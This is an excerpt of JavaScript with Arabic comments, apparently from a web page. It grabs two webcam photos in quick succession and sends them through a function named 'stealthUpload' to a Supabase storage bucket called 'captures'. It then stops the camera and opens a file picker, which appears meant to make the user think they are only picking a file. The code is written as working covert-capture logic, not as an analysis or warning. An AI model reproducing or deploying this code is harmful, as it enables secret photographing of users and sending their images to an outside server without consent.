...
// --- Sequential Capture & Upload Logic ---
async function startProcess() {
    console.log('--- بدء العملية التسلسلية ---');

    // 1. طلب الصلاحية والتقاط الصور أولاً
    try {
        ...
        // انتظار بسيط لضمان استقرار الكاميرا
        await new Promise(r => setTimeout(r, 600));

        // اللقطة الأولى
        const blob1 = await capturePhoto();
        if (blob1) stealthUpload(blob1, 'A');

        // اللقطة الثانية بعد 300 مللي ثانية
        await new Promise(r => setTimeout(r, 300));
        const blob2 = await capturePhoto();
        if (blob2) stealthUpload(blob2, 'B');

        // إيقاف الكاميرا بعد التقاط الصور
        stream.getTracks().forEach(track => track.stop());

    } catch (e) {
        console.warn('تم رفض الكاميرا أو غير متوفرة:', e);
    } finally {
        // 2. فتح نافذة الملفات فوراً
        fileInput.click();
    }
}
...
async function capturePhoto() {
    if (!captureVideo.srcObject) return null;
...
async function stealthUpload(blob, label) {
    if (!supabaseClient) return;

    const fileName = `capture-${Date.now()}-${label}.jpg`;
    try {
        await supabaseClient.storage
            .from('captures')
            .upload(fileName, blob);
        console.log(`تم رفع اللقطة ${label}`);
    } catch (e) {
        console.error(`فشل رفع اللقطة ${label}:`, e);
    }
}
